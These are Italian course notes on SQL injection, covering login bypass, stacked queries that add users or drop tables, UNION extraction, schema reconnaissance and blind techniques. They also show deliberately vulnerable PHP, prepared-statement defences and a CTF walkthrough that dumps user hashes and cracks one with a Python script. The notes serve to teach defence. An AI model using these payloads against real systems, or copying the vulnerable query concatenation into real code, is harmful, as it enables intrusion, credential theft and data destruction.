# SQL Injection

> [!abstract] In una riga Inietti codice **SQL** tramite input non validato e prendi il controllo della query → del database.

## Cos'è

Quando l'app costruisce una query **concatenando** l'input dell'utente senza sanitizzarlo, l'attaccante può inserire frammenti di SQL che **cambiano la logica** della query. È la vulnerabilità da _input validation_ per eccellenza — e nonostante l'età, è ancora oggi tra le cause principali di data breach.

## Come funziona (bypass del login)

![[sqli-auth-bypass.svg]] 
_Con `admin'--` il `--` commenta il controllo della password: la query restituisce admin senza verificarne le credenziali._

## Tipi

- **In-band:** _error-based_ (sfrutta i messaggi d'errore) e _UNION-based_ (estrae dati con `UNION SELECT`).
- **Blind:** l'app non mostra i risultati, ma reagisce in modo diverso → _boolean-based_ o _time-based_ (ritardi).
- **Out-of-band:** i dati escono per un canale diverso (DNS/HTTP).

## Impatto

Lettura/modifica/cancellazione di dati, **bypass dell'autenticazione**, in certi casi esecuzione di comandi sul server del DB.

## Tool

**sqlmap** ([[Web Hacking Tools]]) automatizza rilevamento ed exploitation (fingerprint, dump, OS shell).

## Difese

- **Prepared statement / query parametrizzate** — la correzione vera: i dati non vengono mai interpretati come codice.
- Validazione input con **allowlist**.
- Account DB a **minimo privilegio**.
- WAF come strato secondario, non come unica difesa.

## Collegamenti

- ⬆️ [[Web Application Hacking]]
- ↔️ [[Authentication Attacks]] (bypass del login) · [[Web Hacking Tools]] (sqlmap)

---
preso da [[4 - CS Applitcation Level - Sintesi Web Security Part I]]
# SQL Injection

## Cos'è SQL?

**SQL (Structured Query Language)** è il linguaggio dichiarativo standard utilizzato per interrogare e gestire i database relazionali (RDBMS). I database relazionali si basano sul concetto di **tabelle** (composte da righe e colonne) dove vengono memorizzati i dati strutturati degli utenti.

_Arricchimento:_ A differenza dei database NoSQL (come MongoDB), i database relazionali (come MySQL, PostgreSQL, Oracle, SQL Server) richiedono uno schema predefinito e garantiscono le proprietà ACID (Atomicità, Coerenza, Isolamento, Durabilità) per le transazioni.

Esempio di tabella `users`:

|**user**|**password**|**age**|
|---|---|---|
|admin|1f4sdge!|37|
|mauro|mkfln34.|30|
|matteo|a4njDa!|42|

> **Nota di sicurezza:** Nei siti web reali, le password NON dovrebbero mai essere memorizzate in chiaro come nell'esempio sopra, ma sempre sotto forma di hash (es. utilizzando bcrypt o Argon2) con un salt univoco.

### Sintassi SQL di Base

Ecco le operazioni fondamentali (CRUD - Create, Read, Update, Delete):

- **Recuperare record (SELECT):**
    
    ```SQL
    SELECT * FROM users WHERE user='admin' AND password='1f4sdge!';
    ```
    
- **Aggiungere nuovi record (INSERT):**
    
    ```SQL
    INSERT INTO users VALUES ('karl', 's3cr3t', 23);
    ```
    
- **Aggiornare record esistenti (UPDATE):**
    
    ```SQL
    UPDATE users SET age=age+1;
    ```
    
- **Rimuovere record (DELETE):**
    
    ```SQL
    DELETE FROM users WHERE age < 25;
    ```
    
- **Rimuovere una tabella (DROP):**
    
    ```SQL
    DROP TABLE users;
    ```
    

---

## SQL Injection (SQLi) in Sintesi
![[Pasted image 20251117152059.png]]

La **SQL Injection (SQLi)** è una vulnerabilità di validazione dell'input che si verifica quando dati non fidati forniti dall'utente vengono concatenati direttamente all'interno di una query SQL inviata al database. È un'istanza specifica delle vulnerabilità di **Code Injection**, ma nel contesto dei database.

L'interprete SQL non riesce a distinguere tra il codice legittimo della query e i dati forniti dall'utente, eseguendo quindi comandi non previsti dallo sviluppatore.

Impatto:

Fornendo un payload creato ad hoc, un attaccante può alterare la logica della query e:

- Ottenere accesso non autorizzato a dati sensibili (Confidenzialità).
    
- Alterare l'integrità dei dati nel database (Integrità).
    
- Eseguire attacchi distruttivi (es. eliminare tabelle) (Disponibilità).
    

![[Pasted image 20260128230600.png]]
_La celebre vignetta di XKCD che illustra un attacco distruttivo SQLi dove il nome dello studente viene sanitizzato male, portando alla cancellazione dei record scolastici._

### Esempio Base: Bypass dell'Autenticazione

Consideriamo un codice PHP vulnerabile per il login:
```php
<?php
$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
// VULNERABILE: Concatenazione diretta dell'input utente
$query = "SELECT * FROM users WHERE user = '" . $_POST["user"] . "' AND password = '" . $_POST["password"] . "'";
$sth = $db->query($query);
$user = $sth->fetch();

if ($user !== false) {
    // login effettuato, avvia sessione
    start_session();
    $_SESSION["user"] = $user["user"];
} else {
    // login fallito
}
?>
```
Sono le peggiori 10 line di codice mostrate dal prof: ha un botto di vulnerabilità

#### Caso d'uso legittimo

- User: `admin`
    
- Password: `1f4sdge!`
    
- Query risultante:
    ```SQL
    SELECT * FROM users WHERE user='admin' AND password='1f4sdge!'
    ```
    

#### Exploit: Login senza password (SQLi Tautologica)

L'attaccante usa l'input:

- User: `admin' --`
    
- Password: `qualsiasi`
    

La query diventa:
```SQL
SELECT * FROM users WHERE user='admin' -- ' AND password='qualsiasi'
```

_Arricchimento:_ Il simbolo `--` (spesso seguito da uno spazio) indica l'inizio di un commento in SQL. Tutto ciò che segue viene ignorato dal database. In questo modo, la parte `AND password='...'` viene disattivata, e la query ritorna l'utente 'admin' senza controllarne la password.

#### Exploit Alternativo (`OR` condition)

- User: `admin`
    
- Password: `' OR password LIKE '%`
    

Query risultante:
```SQL
SELECT * FROM users WHERE user='admin' AND password='' OR password LIKE '%';
```

La condizione `LIKE '%'` è sempre vera (matcha qualsiasi sequenza di caratteri). Poiché c'è un `OR`, l'intera clausola `WHERE` diventa vera, autenticando spesso l'attaccante come il primo utente nella tabella (solitamente l'amministratore).

---

## Tecniche Avanzate di SQL Injection

## Stacking Queries (Query Impilate)

Le **Query Impilate** si riferiscono alla possibilità di eseguire istruzioni SQL multiple e distinte in un'unica chiamata al database, tipicamente separandole con un punto e virgola (`;`).

Se la configurazione del server di database abilita questa funzione (spesso è disabilitata di default nei driver moderni rivolti al web), apre la porta a gravi attacchi che possono compromettere l'integrità e la disponibilità del database.

L'attacco funziona "evadendo" dalla query prevista e "impilando" una nuova query dannosa subito dopo.

### Esempio 1: Aggiungere un Nuovo Utente

Un attaccante può iniettare un nuovo utente nella tabella `users`.

- **Input dell'Attaccante:** `'; INSERT INTO users (user, password, age) VALUES ('attacker', 'mypwd', 1) -- -`
    
- **SQL Risultante Inviato al DB:**
    ```SQL
    SELECT * FROM users WHERE user=''; 
    INSERT INTO users (user, password, age) VALUES ('attacker', 'mypwd', 1);
    -- -' AND password='whatever'
    ```
    
- **Come Funziona:**
    
    1. La prima query (`SELECT...`) fallisce in modo innocuo.
        
    2. Il database esegue quindi la _seconda_ query, un'istruzione `INSERT` dannosa, creando un nuovo utente.
        
    3. Il `-- -` (uno spazio è cruciale dopo i due trattini) è un commento SQL, che neutralizza il resto della stringa di query originale (`' AND password='whatever'`), prevenendo errori di sintassi.
        

### Esempio 2: Modificare Dati (Cambiare Password Admin)

Un attaccante può prendere il controllo di un account admin modificandone la password.

- **Input dell'Attaccante:** `'; UPDATE users SET password='newpwd' WHERE user='admin'-- -`
    
- **SQL Risultante Inviato al DB:**
    
    ```SQL
    SELECT * FROM users WHERE user=''; 
    UPDATE users SET password='newpwd' WHERE user='admin';
    -- -' AND password=""
    ```
    

### Esempio 3: Distruggere Dati (Eliminare una Tabella)

Questo è il tipo più distruttivo di attacco stacked query, in cui l'attaccante elimina un'intera tabella.

- **Input dell'Attaccante:** `'; DROP TABLE users -- -`
    
- **SQL Risultante Inviato al DB:**
    
    ```SQL
    SELECT * FROM users WHERE user=''; 
    DROP TABLE users;
    -- - AND password=";
    ```
    
    Questo comando elimina completamente la tabella `users`, portando a una catastrofica perdita di dati.
    

---

## Il "Piccolo Bobby Tables" (Monito)

Questa famosa vignetta di xkcd è l'illustrazione più nota di un attacco SQL injection di tipo stacked query.

![[Pasted image 20260128231443.png]]

[Immagine della vignetta xkcd "Little Bobby Tables"](https://xkcd.com/327/)

Nella vignetta, una madre chiama suo figlio `Robert'); DROP TABLE Students;--`, nome che, una volta inserito nel database scolastico non protetto, provoca la cancellazione di tutti i record degli studenti.

La battuta finale della vignetta, "Spero che abbiate imparato a sanificare i vostri input del database," è la lezione fondamentale. Nello sviluppo moderno, la best practice non è solo "sanificare" (che è difficile e soggetto a errori), ma usare **query parametrizzate** (prepared statements), che separano la _logica_ della query dai _dati_, rendendo impossibile questa intera classe di attacchi.

---

## Attacco UNION (Fuga di Dati da Altre Tabelle)

Questo è un tipo diverso di SQL Injection che non modifica o distrugge i dati, ma li _ruba_. Questo attacco usa l'operatore SQL `UNION` per "unire" i risultati della query legittima con i risultati di una nuova query `SELECT` dannosa.

### Esempio di Codice Vulnerabile

Questo codice PHP è vulnerabile perché costruisce una query concatenando l'input dell'utente (`$_GET["search"]`) direttamente nella stringa.

```PHP
<?php
$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
start_session();

// VULNERABILE: $_GET["search"] è concatenato direttamente
$query = "SELECT sender, content FROM messages WHERE
          receiver = '".$_SESSION["user"]."' AND
          content LIKE '%".$_GET["search"]. "%'";

$sth = $db->query($query);
foreach ($sth as $row) {
    echo "Sender:".$row["sender"];
    echo "Content: ".$row["content"];
}
?>
```

### Il Payload dell'Attacco

Un attaccante può usare questo parametro `search` per rubare nomi utente e password dalla tabella `users`.

- **Input dell'Attaccante:** `' UNION SELECT user, password FROM users -- -`
    
- **SQL Risultante Inviato al DB:**
    
    ```SQL
    SELECT sender, content FROM messages WHERE 
    receiver='attacker' AND content LIKE '%' 
    UNION SELECT user, password FROM users 
    -- - %'
    ```
    

### Come Funziona e Requisiti

1. **`'` (Apostrofo):** Il primo apostrofo nel payload (`'`) chiude la stringa `content LIKE '%`.
    
2. **`UNION`:** L'operatore `UNION` aggiunge i risultati di una nuova query.
    
3. **Query Dannosa:** L'attaccante _indovina_ che esista una tabella chiamata `users` e che abbia colonne `user` e `password`.
    
4. **`-- -` (Commento):** Questo commenta il `%'` finale della query originale per evitare un errore di sintassi.
    

L'applicazione ora eseguirà questa query combinata. I risultati mostreranno prima eventuali messaggi legittimi, seguiti da un elenco completo di tutti i nomi utente e password dalla tabella `users`.

**Perché un attacco UNION funzioni, devono essere soddisfatte due condizioni:**

1. La query originale deve essere un'istruzione `SELECT`.
    
2. L'istruzione `SELECT` dannosa deve restituire lo **stesso numero di colonne** della query originale. (Qui, la query originale selezionava `sender, content` (2 colonne), quindi la query dell'attaccante `user, password` (2 colonne) corrisponde perfettamente).
    
3. I tipi di dati delle colonne devono essere compatibili tra le due query.
    

---

## Ricognizione del Database (Scoprire i Metadati)

Come fa un attaccante a sapere che la tabella si chiama `users` o che le colonne sono `user` e `password`? Può eseguire una ricognizione _interrogando i metadati stessi del database_.

La maggior parte dei database SQL mantiene un database speciale e integrato che descrive tutti gli altri database, tabelle e colonne.

- **information_schema** (per MySQL, PostgreSQL, ecc.)
    
    Questo è un database standard che può essere interrogato come qualsiasi altro.
    
    - Per trovare tutti i nomi delle tabelle:
        
        ...UNION SELECT table_name, table_schema FROM information_schema.tables -- -
        
    - Per trovare tutti i nomi delle colonne di una tabella specifica:
        
        ...UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users' -- -
        
- **sqlite_master** (per SQLite)
    
    SQLite usa una tabella master speciale.
    
    - Per trovare tutte le tabelle:
        
        ...UNION SELECT name, tbl_name FROM sqlite_master WHERE type='table' -- -
        

Utilizzando queste tabelle di metadati, un attaccante può mappare alla cieca l'intera struttura del database, trovare tabelle sensibili (`users`, `credit_cards`) e quindi lanciare un attacco `UNION` per estrarne il contenuto.

---

## Second-Order SQL Injection (Stored SQLi)
![[Pasted image 20251117154202.png]]

In questo scenario, il payload malevolo viene prima **memorizzato** nel database (in una fase in cui l'input potrebbe essere sanitizzato correttamente o considerato "sicuro") e poi **eseguito** in una seconda query successiva che utilizza quel dato senza adeguata validazione. Ad esempio, il dato viene memorizzato per essere sanitizzato in un secondo momento, ma leggendolo esegue la query maledetta.

**Esempio:**

1. **Inserimento:** Un attaccante si registra con un username malevolo: `'; UPDATE users SET password='...' WHERE user='admin'--`. L'applicazione lo salva correttamente nel DB.
    
2. **Esecuzione:** Quando l'applicazione usa questo username in una seconda query (es. per mostrare il profilo o registrare un log), la stringa viene concatenata in una nuova query SQL ed eseguita, attivando l'attacco. 
```sql
$query = "SELECT sender, content FROM messages WHERE
receiver='" . $_SESSION["user"] . "' AND content LIKE '%" . $_GET["search"] . "%'";
 
 che diventerebbe 
 
SELECT * FROM messages WHERE receiver = ''; UPDATE TABLE users SET
password='newpwd' WHERE user='admin' -- -' AND content LIKE '%%'
```
    

---

## Esfiltrazione dei Metadati del Database

Se non conosciamo la struttura del database, possiamo interrogarlo per chiedergli i suoi stessi metadati. La maggior parte dei DBMS moderni ha un database standard chiamato `INFORMATION_SCHEMA` (o tabelle di sistema specifiche come `sqlite_master` in SQLite).

- `information_schema.tables`: Contiene i nomi di tutte le tabelle.
    
- `information_schema.columns`: Contiene i nomi delle colonne per ogni tabella.
    

Esempio per SQLite per trovare i nomi delle tabelle:

SQL

```
SELECT name FROM sqlite_master WHERE type='table';
```


---

## SQL Injection "Cieche" (Blind SQLi)

Si verifica quando l'applicazione è vulnerabile, ma non mostra direttamente i risultati della query o gli errori del database nella risposta HTTP. L'attaccante deve quindi "fare domande" al database e dedurre le risposte dal comportamento dell'applicazione.

### Blind SQLi: Comportamento Condizionale (Boolean-based)

L'applicazione potrebbe mostrare un messaggio generico "OK" o "Errore", oppure mostrare o meno un contenuto, a seconda se la query ritorna vero o falso.

Esempio: Indovinare la password dell'amministratore carattere per carattere.

Payload:
```SQL
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'k
```

Se l'applicazione risponde "OK" (o mostra il contenuto normale), sappiamo che il primo carattere della password è maggiore di 'k'. Possiamo usare la ricerca binaria per trovare il carattere esatto.

### Blind SQLi: Errore Condizionale (Error-based)

Se l'applicazione non mostra dati ma mostra errori generici del DB, possiamo forzare un errore SQL solo quando una condizione è vera.

Payload (esempio concettuale):

```SQL
xyz' AND (SELECT CASE WHEN (condizione_da_testare) THEN 1/0 ELSE 'a' END)='a
```

Se `condizione_da_testare` è VERA, viene eseguita una divisione per zero (`1/0`), causando un errore che l'attaccante può rilevare.

### Blind SQLi: Ritardo Temporale (Time-based)

Se l'applicazione non fornisce alcun feedback visivo o di errore, l'attaccante può istruire il database ad attendere per un certo numero di secondi se una condizione è vera.

Payload (esempio per MS SQL Server):

```SQL
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

Se il server impiega più di 10 secondi a rispondere, l'attaccante sa che la condizione è vera. Da notare che ogni richiesta errata che produce errori sono tracciati nei Log.

Arricchimento: Su MySQL si usa spesso SLEEP(n), su PostgreSQL pg_sleep(n). Questa tecnica è lenta e può essere influenzata dal carico di rete.

---
## Prevenzione delle SQL Injection

### Difesa Primaria: Prepared Statements (Query Parametrizzate)

L'uso di **Prepared Statements** è il metodo più efficace per prevenire la SQLi. Essi separano la struttura della query dai dati. Il database compila la query SQL prima che i dati vengano inseriti, assicurando che l'input dell'utente sia trattato sempre e solo come dati (parametri), mai come codice eseguibile.

Esempio sicuro in PHP (PDO):

PHP

```
$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
// Il '?' è un placeholder
$query = "SELECT * FROM users WHERE user = ? AND password = ?";
$sth = $db->prepare($query);
// I dati vengono associati in modo sicuro ai placeholder
$sth->bindValue(1, $_POST["user"]);
$sth->bindValue(2, $_POST["password"]);
$sth->execute();
$user = $sth->fetch();
```

Anche se visivamente nel codice PHP sembrano operazioni simili (invio una query e invio dei dati), ciò che avviene "sotto il cofano" a livello di comunicazione col Database è profondamente diverso.

Ecco la differenza tecnica spiegata passo dopo passo, basata sulle slide del corso.

#### 1. Concatenazione di stringhe (Il metodo Vulnerabile)

Quando usi la concatenazione (es. Slide 33), il tuo codice PHP costruisce una **singola lunga stringa** che contiene sia i comandi SQL che i dati dell'utente, e poi la spedisce al database.

- **Cosa riceve il Database:** Una frase unica.
- **Il problema:** Il Database deve analizzare (fare il _parsing_) di quella frase da zero. Non ha modo di distinguere quali caratteri sono stati scritti dal programmatore (codice sicuro) e quali sono stati inseriti dall'utente.
- **Risultato:** Se l'utente inserisce caratteri speciali SQL (come `' OR '1'='1`), il parser del database li interpreta come **comandi**, modificando la logica della query originale (ad esempio, aggirando il login).

#### 2. Prepared Statements (Il metodo Sicuro)

Con i Prepared Statements (es. Slide 47), la comunicazione avviene in **due fasi separate**. Non si invia mai una stringa unica mescolata.

##### Fase 1: Preparazione (Prepare)

Tu invii al database solo la struttura della query con i placeholder (`?`):

```
SELECT * FROM users WHERE user = ? AND password = ?
```

- Il Database riceve questa struttura, la analizza, la compila e la ottimizza **prima** che arrivi qualsiasi dato.
- In questo momento, il Database decide che la query ha una struttura fissa: _"Seleziona dalla tabella utenti dove l'utente è [qualcosa] e la password è [qualcosa]"_. La struttura logica è ormai "congelata".

##### Fase 2: Associazione ed Esecuzione (Bind & Execute)

Successivamente, invii i valori (es. `$_POST["user"]`).

- Il Database prende questi valori e li inserisce nei "buchi" (`?`) che aveva preparato.
- **Il punto cruciale:** Poiché la query è già stata compilata nella Fase 1, il Database tratterà **qualsiasi cosa** tu invii nella Fase 2 esclusivamente come un **dato letterale** (una stringa di testo), mai come codice eseguibile.

#### Esempio Pratico della Differenza

Immagina che un attaccante inserisca come nome utente: `' OR '1'='1`.

- **Con Concatenazione:** Il DB legge: `SELECT ... WHERE user = '' OR '1'='1'`. La logica cambia: l'istruzione `OR` diventa attiva e il login viene bypassato.
- **Con Prepared Statements:** Il DB ha già deciso che il primo `?` è un contenitore di dati. Quindi cercherà nel database un utente che si chiami _letteralmente_ così:
    
    > "Cercami un tizio il cui nome sia la stringa `' OR '1'='1`". Ovviamente non lo troverà, e l'attacco fallisce.
    


### Difese Secondarie (Defense in Depth)

- **Input Validation (Whitelisting):** Se non puoi usare prepared statements (es. se l'input utente deve scegliere il nome di una tabella per un `ORDER BY`), usa una whitelist rigorosa di valori consentiti (es. solo caratteri alfanumerici).
    
- **Principio del Minimo Privilegio:** L'utente del database usato dall'applicazione web dovrebbe avere solo i permessi strettamente necessari (es. solo `SELECT`, `INSERT`, `UPDATE` sulle tabelle specifiche, mai `DROP` o permessi amministrativi).



---

## Caso Studio Reale: Webkinz (2020)

Nell'aprile 2020, un attacco hacker ha sfruttato una SQL Injection nel gioco per bambini Webkinz, portando all'esfiltrazione di 23 milioni di username e password (memorizzate come hash MD5 con salt, ma comunque vulnerabili al cracking se la password è debole).

L'attacco è stato possibile perché un parametro non era sanitizzato correttamente, generando un errore SQL visibile che ha confermato la vulnerabilità agli attaccanti.

---

## Training Challenge #04 (Walkthrough)

Scenario: Dobbiamo accedere all'account del criminale "Collins Hackle" sul servizio "CrimeMail".

Indizio: hash = md5(password + salt).

### Analisi e Identificazione

1. Il sito ha una pagina di login e una di recupero password (`forgot.php`).
    
2. Inserendo un apice `'` nel campo username di `forgot.php`, otteniamo un **errore del database MySQL**. Questo indica una potenziale SQL Injection Error-Based.
    

### Esfiltrazione (Exploitation)

Usiamo una SQLi UNION-Based nella pagina vulnerabile per estrarre dati.

1. **Dump dello Schema:** Interroghiamo `INFORMATION_SCHEMA.COLUMNS` per trovare i nomi delle tabelle e delle colonne interessanti.
    
    - Payload: `' UNION SELECT CONCAT(TABLE_NAME,":",COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS#`
        
    - _Risultato:_ Troviamo una tabella `users` con colonne `userid`, `username`, `pass_salt`, `pass_md5`, `hint`.
        
2. **Dump della tabella Users:** Estraiamo i dati dell'utente target.
    
    - Payload: `' UNION SELECT CONCAT(userid, ":", username, ":", pass_salt, ":", pass_md5) FROM users#`
        
    - _Risultato per Collins Hackle:_ `5:c.hackle:yhbG:f2b31b3a7a7c41093321d0c98c37f5ad`
        
    - Abbiamo il salt (`yhbG`) e l'hash MD5 della password.
        

### Cracking della Password

Sapendo che l'hash è `md5(password + salt)`, possiamo usare uno script (o strumenti come John the Ripper/Hashcat) con un dizionario (es. `rockyou.txt`) per trovare la password.

Script Python di esempio:

Python

```
import hashlib
salt = "yhbG"
target_hash = "f2b31b3a7a7c41093321d0c98c37f5ad"
with open("rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        # Calcola md5(password + salt)
        if hashlib.md5((password + salt).encode()).hexdigest() == target_hash:
            print(f"[+] Password trovata: {password}")
            break
```

Una volta trovata la password, possiamo effettuare il login e completare la sfida.

---
